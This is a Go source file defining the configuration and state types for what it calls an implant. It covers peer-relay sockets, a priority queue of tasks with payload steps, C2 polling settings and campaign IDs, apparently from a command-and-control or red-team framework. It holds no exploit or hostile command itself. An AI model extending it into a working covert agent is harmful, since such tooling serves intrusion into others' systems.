package config

import (
	"container/heap"
	"net"
	"time"
)

const (
	Peer2Peer int = 0
	Internet  int = 1
)

const (
	TCP int = 0
	UDP int = 1
)

type NeighborStructure struct {
	Id                       string
	InternetConnectivityType int // Peer2Peer or Internet
	P2PChannel               int // TCP or UDP
	Socket                   net.Conn
}

func (neighbor NeighborStructure) GetRemoteAddr() string {
	return neighbor.Socket.RemoteAddr().String()
}

func (neighbor NeighborStructure) SendBytes(data []byte) {
	if neighbor.P2PChannel == TCP {
		_, _ = neighbor.Socket.Write(data)
		_, _ = neighbor.Socket.Write([]byte{0x0a})
	}
}

/*
TASKING SYSTEM
*/
type StepsRequest struct {
	Id       int
	Task     TaskRequest
	Priority int
}

type TaskRequestStep struct {
	Id               int
	Type             string
	ContinueIfFailed bool
	Delay            int
	Payload          map[string]string
}

type TaskRequest struct {
	Id       int
	Priority int
	Steps    []TaskRequestStep
}

type TaskStepResponse struct {
	TaskId   int    `json:"task_id"`
	StepId   int    `json:"step_id"`
	StatusId int    `json:"status_id"`
	Data     any    `json:"data"`
	ApiPath  string `json:"-"`
}

type WrappedTaskStep struct {
	TaskStepRequest  TaskRequestStep
	TaskStepResponse TaskStepResponse
}

type Item struct {
	Value    TaskRequest
	Priority int
	Index    int
}

// A PriorityQueue implements heap.Interface and holds Items.
type PriorityQueue []*Item

func (pq PriorityQueue) Len() int { return len(pq) }

func (pq PriorityQueue) Less(i, j int) bool {
	// We want Pop to give us the highest, not lowest, Priority so we use greater than here.
	return pq[i].Priority > pq[j].Priority
}

func (pq PriorityQueue) Swap(i, j int) {
	pq[i], pq[j] = pq[j], pq[i]
	pq[i].Index = i
	pq[j].Index = j
}

func (pq *PriorityQueue) Push(x any) {
	n := len(*pq)
	item := x.(*Item)
	item.Index = n
	*pq = append(*pq, item)
}

func (pq *PriorityQueue) Pop() any {
	old := *pq
	n := len(old)
	item := old[n-1]
	old[n-1] = nil  // avoid memory leak
	item.Index = -1 // for safety
	*pq = old[0 : n-1]

	return item
}

func (pq *PriorityQueue) Update(item *Item, value TaskRequest, priority int) {
	item.Value = value
	item.Priority = priority
	heap.Fix(pq, item.Index)
}

/**
IMPLANT
*/

type ImplantConfigurationState struct {
	C2PollingRate time.Duration
	QueueTimeout  time.Duration
}

type ImplantState struct {
	Id                string
	CampaignId        int
	RelayImplant      string
	CommunicationMode int
	Neighbors         map[string]NeighborStructure
	Tasks             PriorityQueue
	Configuration     ImplantConfigurationState
}

func (implant ImplantState) HaveInternetAccess() bool {
	return implant.CommunicationMode == Internet
}

func (implant *ImplantState) AddTasksToQueue(tasks []TaskRequest) {
	i := 0

	for z := 0; z < len(tasks); z++ {
		item := &Item{
			Value:    tasks[z],
			Priority: tasks[z].Priority,
			Index:    i,
		}

		heap.Push(&implant.Tasks, item)
		i++
	}
}

type GenericApiCommunicationWrapper struct {
	Data string `json:"data"`
}
